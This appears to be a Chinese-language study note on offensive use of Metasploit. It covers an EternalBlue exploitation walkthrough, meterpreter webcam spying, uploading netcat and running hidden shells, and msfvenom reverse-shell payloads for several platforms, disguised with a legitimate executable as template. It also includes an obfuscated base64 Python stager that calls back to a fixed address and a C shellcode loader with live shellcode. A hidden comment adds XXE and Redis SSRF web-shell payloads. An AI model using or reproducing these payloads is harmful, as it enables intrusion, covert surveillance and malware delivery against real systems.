<!---
```diff
+ green color text
- red color text
```
-->

+ 進入metasploit
  - msfdb init : 初始化數據庫 (若沒執行這行，連接數據庫會有問題)
  - msfconsole : 啟動
  - workspace : 當前工作區
  - db_status :　是否成功連接到數據庫
  - workspace -a meow :　另創一個數據庫meow
  - ? : 通過?查看當前工作區可以使用的指令
  
![image](https://user-images.githubusercontent.com/96654161/170452994-0fe2ddb7-384f-4459-ac3f-a124c83b3922.png)

+ 信息蒐集 -> 內網主機發現
  - db_nmap : nmap掃描
    - -PA : TCP ACK PING掃描
    - -PS : TCP SYN PING掃描
    - -PR : ARP掃描nmap對目標進行arp ping掃描的過程，尤其在內網的情況下。因為防火牆不會禁止ARP請求
    - hosts : 列出當前工作區所有主機
    
  - 1.ifconfig 查看當前哪些主機存活
  - 2.db_nmap -PR IP/24
  
![image](https://user-images.githubusercontent.com/96654161/170454550-ace64ee5-bc5b-441c-9a1f-336568b2abd2.png)

     -T[0-5] : 莫認為T3、T4表示最大TCP掃描延遲為10ms
     sS : TCP SYN掃描
     sA : TCP ACK掃描
     sY : TCP SYN掃描
     A : 打開操作系統探測和版本探測
 
  - db_nmap -sS -A -T4 192.168.xx.x
![image](https://user-images.githubusercontent.com/96654161/170462660-3b86cb80-6cd1-4b8b-845f-fccd63797fb7.png)

  - db_nmap --script=vuln IP
    - script=vuln : 檢查是否具有常見漏洞
![image](https://user-images.githubusercontent.com/96654161/170464782-26acc2ae-f016-4e50-a663-93dcd80ac177.png)
>這裡找到ms17_010

+ auxiliary 模塊
  - search ms17_010
 
![image](https://user-images.githubusercontent.com/96654161/170476395-67b42a48-a313-4595-aaac-7a59570dcdbd.png)
>這裡看到第三項，描述的是for win8，但在前面掃描OS是win7所以不適用

  - info auxiliary/scanner/smb/smb_ms17_010

![image](https://user-images.githubusercontent.com/96654161/170468777-31bd8a4c-e86d-4584-a37c-e2f938d267c9.png)

  - use auxiliary/scanner/smb/smb_ms17_010 #要使用某模塊都用 use modules
  - options 查看設置 ->required 如果是yes就必須要配置
![image](https://user-images.githubusercontent.com/96654161/170471161-04096171-0096-4c96-92e6-fc5cc911859c.png)

  - set RHOSTS 掃描主機IP
  - run / exploit 執行
![image](https://user-images.githubusercontent.com/96654161/170472589-93bc1135-7785-47a5-b28e-c4e3d361b9fe.png)

+ use exploit/windows/smb/ms17_010_eternalblue
+ options
+ set rhosts ip
+ show targets
+ run

![image](https://user-images.githubusercontent.com/96654161/170538076-6daa23d6-324e-4a85-af13-0ba5bc71738e.png)
![image](https://user-images.githubusercontent.com/96654161/170542273-10a4a4fb-3675-4f8a-a251-9986197e8170.png)
![image](https://user-images.githubusercontent.com/96654161/170542834-39ae3629-4501-4b9b-8d89-03b2771d5806.png)

>sessions[-l] : 列出當前所有session
>sessions[-i]id:進入某個session
>background : 把當前shell放到後台去執行，然後返回到MSF中

![image](https://user-images.githubusercontent.com/96654161/170543869-79dae501-522f-4151-80f5-8cb957994134.png)

```diff
show exploits -> 查看所有可用的滲透攻擊程序代碼 
show auxiliary -> 查看所有可用的輔助攻擊工具
[show]options/advanced -> 查看該模塊可用選項
show payloads -> 查看該模塊適用的所有載荷代碼
show targets -> 查看該模塊適用的攻擊目標類型
search -> 根據關鍵字搜索某模塊
info -> 顯示某模塊的詳細信息
use -> 使用某滲透攻擊模塊
back -> 回退
set/unset -> 設置/禁用模塊中的某個參數
setg/unsetg -> 設置/禁用適用於所有模塊的全局參數
save -> 將當前設置值保存下來，以便下次啟動MSF終端時仍可使用
```
### 開啟攝像頭

+ sessions -u id : 將某個session轉為meterpreter
+ 由shell轉meterpreter 

![image](https://user-images.githubusercontent.com/96654161/170551298-5e7490c3-eedf-4547-8adb-2a0e2f713a98.png)

+ sessions -i id
+ ? (查看當前可以使用的命令)
![image](https://user-images.githubusercontent.com/96654161/170551366-390beaf3-9fec-4584-bd8d-3e76906cdc2b.png)
![image](https://user-images.githubusercontent.com/96654161/170551422-770a6fbc-db10-471f-940b-972ef34aadc1.png)
![image](https://user-images.githubusercontent.com/96654161/170551811-67a65e65-2925-4c1d-b39e-57b99f996055.png)
![image](https://user-images.githubusercontent.com/96654161/170551958-4c27c0c4-ab7a-4d03-a48f-c869a391b668.png)

+ webcam_list : 查看攝像頭 列出對方的攝像頭
+ webcam_snap : 通過攝像頭拍照 
+ webcam_stream : 通過攝像頭開啟視頻
![image](https://user-images.githubusercontent.com/96654161/170553668-bd7808e9-d768-4aa3-872c-83e8392e8c40.png)

+ upload : 上傳本地文件到目標機器
+ upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32

![image](https://user-images.githubusercontent.com/96654161/170554858-4d4c5e79-b402-43b8-b659-505b5fd1a45c.png)


+ execute -H -i -f cmd.exe
+ execute : 再目標機器執行文件，創建新process cmd.exe,-H不可見,-i交互

![image](https://user-images.githubusercontent.com/96654161/170554951-c24df2ab-ee80-46f1-9967-8fca0d3619d4.png)
>上傳後執行

### msfvenom

+ msfvenom是msfpayload和msfencode的組合，將這兩工具集成在一個框架實例中
+ 用來生成後門的軟件，在目標機上執行後門，在本地監聽上線

```diff
-p : --payload,指定特定的payload 如果被設置為 - 那麼從標準輸入流中讀取,幾乎支援所有系統平台
-l : --list 列出所有可用的項目 其中值可以被設置為 payload,encoders,nops,all
-n : --nopsled 指定nop在payload中的數量
-f : --format 指定payload的輸出格式(.exe、.sh..)(--list formats : 列出所有可用的輸出格式)
-e : --encoder，指定使用的encoder
-a : --arch 指定目標系統架構
--platform : 指定目標系統平台
-s : --space 設置未經編碼的payload最大長度(--encoder-space:編碼後的payload的最大長度)
-b : --bad-chars 設置需要在payload中避免出現的字符 EX:'\0f'、'\x00'
-i : iterations 設置payload的編碼次數
--smallest : 盡可能生成最短payload
-o : --out 保存payload文件
-c : --add-code 指定一個附加的win32 shellcode 文件
-x : --template 指定一個特定的可執行文件作為模板
-k : --keep 保護模板程序的功能 注入payload作為一個新的進程運行
```

+ linux **(LHOST 跟 LPORT 是對當前選擇的payload設置要回連的地址及端口去做設置)**
  + msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f elf > shell.elf  (反向連接模塊 目標主機主動來連本地主機)
  + msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=<Target IP Address> LPORT=<Port to connect ON> -f elf > shell.elf (本地主機主動連接目標主機)

+ windows
  + msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f exe > shell.exe 
  + msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xx.xxx LPORT=xxxx -x /root/Desktop/StampRemover.exe -e x86/shikata_ga_nai -f exe -o /var/www/html/heello.exe

 **x86/shikata_ga_nai:等級為excellent ; 解碼跟編碼過程都是隨機生成的** 
![image](https://user-images.githubusercontent.com/96654161/170610208-3347eff2-359e-48c9-a9e3-04a5f46a2e81.png)
> 看到 cmd/powershell_base64   excellent  Powershell Base64 Command Encoder
> x86/shikata_ga_nai      excellent  Polymorphic XOR Additive Feedback En
>只有這兩個encoder是excellent

>-x /root/Desktop/StampRemover.exe 如果沒指定模板文件，預設執行檔icon會是一般的執行檔樣式，有指定模板文件的話，除了icon會一樣，文件大小也會差不多，較能成功偽裝正常文件。/root/Desktop/StampRemover.exe是模板文件位置
>![image](https://user-images.githubusercontent.com/96654161/170607393-4a3fb9da-cd0e-4b5b-9a98-1816ff65b26e.png)

  
![image](https://user-images.githubusercontent.com/96654161/170606643-4847649d-a271-4b68-b3f1-671803cfb893.png)
  
>通常存到/var/www/html底下，外部機器想要下載的話，需要用service apache2 start
>![image](https://user-images.githubusercontent.com/96654161/170607020-c3911031-6915-41b8-997b-df410fe232c0.png)

  
+ 在被攻擊機器上下載好payload後，在本地msfconsole測試是否可成功回連
  + use exploit/multi/handler 該模塊是一個有效負載處理程序，他只處理在受損主機中執行的有效負載連接
  + options
  + set payload windows/meterpreter/reverse_tcp (這裡設置的payload要跟msfvenom設置的payload一樣)
 ![image](https://user-images.githubusercontent.com/96654161/170608676-f9d6480f-749e-4088-a9d1-18580305043f.png)
  + options 
  + set lhosts ip address(這裡的ip要跟msfvenom設置的一樣)
  + set lport port(這裡的port要跟msfvenom設置的一樣)
  + run
![image](https://user-images.githubusercontent.com/96654161/170618722-e0d4750b-e277-406f-9165-2452280951b6.png)
  
>運行成功的話，會在被攻擊機上成功執行該payload，可以在工作管理員查看
![image](https://user-images.githubusercontent.com/96654161/170618573-3f33b4e9-2795-474d-aa07-f4732abde311.png)

+ mac
  + msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f macho > shell.macho
  
+ web payload
  + php (因為前面--list formats列出的所有格式中沒有php的輸出格式，所以在這裡可以用raw去生成)
    + msfvenom -p php/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f raw > shell.php
    + msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.xx.xxx LPORT=xxxx -f raw -o /root/Desktop/shell_.php
      + use exploit/multi/handler
      + set payload php/meterpreter/reverse_tcp
      + options
      + set lhost ip (要跟msfvenom設置的ip一樣)
      + set lport port (要跟msfvenom設置的port一樣)
      + run
  + asp
    + msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f aspx -o shell.aspx
  + jsp
    + msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f raw > shell.jsp
  + war
    + msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f war > shel.war
 
+ 腳本 payload
  + python
    + msfvenom -p python/meterpreter/reverse_tcp LHOST=<Your IP Address> LPORT=<Port to connect ON> -f raw >shell.py
      + 生成出的shell.py，將內容複製到被攻擊機器上的cmd
      + python -c "exec(__import__('base64').b64decode(__import__('codecs').getencoder('utf-8')('aW1wb3J0IHNvY2tldCx6bGliLGJhc2U2NCxzdHJ1Y3QsdGltZQpmb3IgeCBpbiByYW5nZSgxMCk6Cgl0cnk6CgkJcz1zb2NrZXQuc29ja2V0KDIsc29ja2V0LlNPQ0tfU1RSRUFNKQoJCXMuY29ubmVjdCgoJzE5Mi4xNjguMzAuMTMxJyw4Nzg3KSkKCQlicmVhawoJZXhjZXB0OgoJCXRpbWUuc2xlZXAoNSkKbD1zdHJ1Y3QudW5wYWNrKCc+SScscy5yZWN2KDQpKVswXQpkPXMucmVjdihsKQp3aGlsZSBsZW4oZCk8bDoKCWQrPXMucmVjdihsLWxlbihkKSkKZXhlYyh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShkKSkseydzJzpzfSkK')[0]))"
    + 開啟msfconsole
      + set payload python/meterpreter/reverse_tcp
      + options
      + set lhost ip (要跟msfvenom設置的ip一樣)
      + set lport port (要跟msfvenom設置的port一樣)
      + run
  ![image](https://user-images.githubusercontent.com/96654161/170620929-8a7d7a3e-f919-4c49-b9f5-1fda69bdc368.png)
  + bash
    + msfvenom -p cmd/unix/reverse_bash LHOST=<Your IP Address> LPORT=<Port to connect ON> -f raw >shell.sh
  + perl
    + msfvenom -p cmd/unix/reverse_perl LHOST=<Your IP Address> LPORT=<Port to connect ON> -f raw >shell.pl
 
+ shellcode
  + windows
    + msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f <language>
      + msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xxx.xxx LPORT=xxxx -e x86/shikata_ga_nai -i 6 -b '\x00' -f c -o shell.c
      + 申請動態內存加載shellcode
      + ![image](https://user-images.githubusercontent.com/96654161/170624239-63d80625-085e-428f-8cbc-f8d90164476d.png)
      + set payload windows/meterpreter/reverse_tcp
      + set lhost ip (要跟msfvenom設置的ip一樣)
      + set lport port (要跟msfvenom設置的port一樣)
      + run
![image](https://user-images.githubusercontent.com/96654161/170626579-1812f21f-4768-4eae-8c35-b7a3b1507ec0.png)

```c=
// 申請動態內存加載shellcode
#include <Windows.h>
#include <stdio.h>
#include <string.h>

#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")// windows控制台程序不出黑窗口

unsigned char buf[] =
"\xbe\x7c\xd5\x22\xc5\xd9\xc5\xd9\x74\x24\xf4\x58\x33\xc9\xb1"
"\x7b\x83\xc0\x04\x31\x70\x0f\x03\x70\x73\x37\xd7\x7e\xb9\x76"
"\x20\xa7\x66\xa6\x88\xd3\xbc\xa3\x71\x37\x75\xfa\xf2\x76\xdf"
"\xe9\xf9\x22\xcb\x92\x14\x2e\x23\xa0\x09\x22\x0e\x0a\xff\xbb"
"\x27\x1d\xd4\x21\x1f\x87\xe6\x8a\x48\xbf\x7d\x24\x7b\x90\xe2"
"\x47\xb1\x1c\x6b\x40\x97\x15\x3c\xec\xdc\xbb\x2c\xd5\xc1\xdf"
"\xda\x05\x22\x71\x42\xb8\xa4\xc7\x2a\x0a\x2e\xe0\xac\x31\xee"
"\x16\xc5\x45\xce\x3b\x29\x86\x04\x10\x91\xf2\x86\xda\xb9\xab"
"\x05\xe6\xdc\x96\x55\x02\x09\x8f\x0c\x50\x8a\x96\x17\x25\x02"
"\xe3\x37\x37\x76\xa7\x2c\x99\x01\x48\xb1\x09\x13\x27\x7b\xc1"
"\x11\x9a\xd9\xd2\xa5\xd0\x3d\xec\xed\x4c\xda\x57\xaa\x2a\x8f"
"\x85\x45\xf1\x3e\xc8\x45\x99\x8b\xf8\xde\x2e\x9b\xac\x9d\x89"
"\xcc\x9c\x44\x86\x88\xf3\xb8\xd2\x46\x14\x9d\xb5\xa0\x0b\x9e"
"\xd8\x84\x5e\x4c\x9b\x9d\x24\x15\x21\xed\x82\x62\x57\x94\x4f"
"\x9a\x35\xc7\x0a\x1d\x3f\xa9\x59\xf3\x8e\x4c\x6a\xc9\x6a\x82"
"\xe8\x5a\xda\x63\x87\x02\x57\xe0\xa9\x5e\x21\x9d\xc5\x9e\x03"
"\x25\x52\x17\xdf\xc5\x95\x23\x03\x59\x3f\xe4\x0d\x9a\xe2\xad"
"\x63\x57\xfa\xe9\x78\x5e\xb8\x99\x22\x44\x61\xaf\x27\xa5\xa7"
"\x6c\xb0\x22\xae\xa6\x1d\x60\xbc\xe1\x78\xe9\x38\x5b\x43\x0e"
"\xca\xac\x56\x27\x89\x91\x55\x49\x64\x79\x1b\x95\xe7\x31\x40"
"\x2f\x7e\xf0\x1e\xd0\x88\xe5\xa8\xb3\x11\xdf\xc1\x3e\x4e\x3c"
"\xe0\x19\x88\x01\xe6\x77\xe9\x2b\x1e\xbf\x6c\x75\x0d\x8e\x5e"
"\x42\x73\x53\x87\xf0\xbf\x1f\x4b\x6f\xff\x69\x7b\xd0\x4b\xb5"
"\x58\xc0\x20\x3f\xfe\x64\xa2\x62\x6a\x2a\x35\x6d\x51\xcf\x35"
"\x37\x1e\x82\xc3\x77\xa2\x8e\x41\x18\x5d\xd6\xfb\x66\xd0\x97"
"\xbf\xc6\x3f\x7f\x9e\xca\x2a\x31\xb9\x9e\x22\xda\x40\x14\xce"
"\x81\x12\x5a\xa5\x60\x4e\x79\x0b\x4b\x70\x1a\x04\x77\x7b\x85"
"\x57\x87\x37\xbd\x6a\xe6\x53\x52\xa5\x7a\x41\xfe\x7a\x8d\xf0"
"\x58\x4e\xa6\x7f\x6d\x9e\xe9\xf2\x51\x89\x6d\xbe\xd4\xf5\x81"
"\x60\x8e\x4d\xd1\x8b\xae\x01\xa9\xad\x2f\x49\xc8\xaa\xd7\x47"
"\x51\xb2\xe1\x40\x0a\xbc\x8b\xdf\x4d\xc3\x82\xeb\xda\x13\x9a"
"\x43\xd3\x1d\xc8\x83\x61\x3c\x98\x6f\x49\x89\x21\x25\xb6\x83"
"\x1c\x83\xdf\x5b\x5b\x65\x71\x80\x7d\xbf\x89\xcd\x4f\x03\x53"
"\x6a\xaa\x67\x98\x64\x64\xc7\x52\xe9\x38\xe1\xd7\x69\xc5\x19"
"\x56\x53\xcd\x5c\x08\x7f";
//把剛剛生成的shell.c丟進來

main()
{
    char* Memory;
    Memory = VirtualAlloc(NULL, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(Memory, buf, sizeof(buf));
    ((void (*)())Memory)();
}
  
```
  + linux
    + msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f <language>
  + mac
    + msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port to connect ON> -f <language>
  
  
  
  
  
  
  
  

<!---
XXE 
<!DOCTYPE kaibro[
       <!ENTITY xxe SYSTEM "file:///etc/passwd">
     ]>
     <root>&xxe;</root>
     
 SSRF gopher     
 gopher://localhost:6379/_FLUSHALL%0d%0aSET%20kaibro%20"<%3F=system($_GET[1]);%3F>"%0d%0aCONFIG%20SET%20DIR%20/www/%0d%0aCONFIG%20SET%20DBFILENAME%20ggininder123.php%0d%0aSAVE%0d%0aQUIT

-->
